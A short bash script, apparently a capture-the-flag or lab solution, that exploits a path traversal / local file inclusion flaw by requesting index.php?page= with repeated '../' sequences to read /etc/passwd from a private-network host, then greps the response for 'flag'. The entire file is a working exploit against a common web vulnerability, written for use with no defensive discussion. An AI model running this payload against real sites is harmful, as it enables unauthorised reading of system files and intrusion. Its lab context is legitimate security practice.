#!/usr/bin/env bash

URL_ROOT="${1:-http://10.13.248.102}"
URL="$URL_ROOT/index.php?page=../../../../../../../../../../etc/passwd"
curl $URL 2>/dev/null | grep "flag" --color=auto
